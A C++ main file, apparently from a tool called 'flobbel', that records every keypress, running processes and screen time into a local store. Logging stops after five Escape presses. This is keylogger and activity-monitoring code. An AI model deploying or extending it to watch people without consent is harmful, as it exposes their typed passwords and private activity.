#include <iostream>
#include <deque>

#include "flobcallbackcollection.h"
#include "FlobbelSafe.h"

std::unordered_map<UINT, std::string> keys;
ComputerHandle globalHandle = -1;
std::set<std::string> blacklist;

void process(ProcessInfo);
void keypress(KeypressInfo);
void screentime(Screentime);

void initialize_flobbel();
void keySequence(DWORD vkCode);

FlobCallbackCollection callbackCollection(process,keypress, screentime);
FlobbelSafe *safe;

int main() {
    initialize_flobbel();
    safe = new FlobbelSafe(fucked_up_directory);
    callbackCollection.run();
    return 0;
}

void process(ProcessInfo info){
    std::cout << info.filename << "|" << info.timestamp_on << " to " << info.timestamp_off << "\n";
    safe->add_prc(info);
}

void keypress(KeypressInfo info){
    std::string d(info.descr,4);
    if(info.updown %2 == 0) {
        std::cout << d << " " << std::hex << info.ch << "\n";
        keySequence(info.vkcode);
    }
    safe->add_key(info);
}

void screentime(Screentime info){
    std::cout << "Screentime: <on> " << info.timestamp_on << " <off> " << info.timestamp_off << " <duration> " << info.duration << " minutes\n";
    safe->add_screentime(info);
}

void keySequence(DWORD vkCode){
    static std::deque<DWORD> sequence;
    if(sequence.size()<4){
        sequence.push_back(vkCode);
        return;
    }else if(sequence.size()==4){
        sequence.push_back(vkCode);
    }else{
        sequence.pop_front();
        sequence.push_back(vkCode);
    }
    for(DWORD &x : sequence){
        if(x != VK_ESCAPE){
            return;
        }
    }
    callbackCollection.terminate();
}

void initialize_flobbel() {
    initMap();
    globalHandle = getComputerHandle(fucked_up_directory"lookupfile.data");
    blacklist.insert("svchost.exe");
    blacklist.insert("ctfmon.exe");
    callbackCollection.setProgramBlacklist(blacklist);
}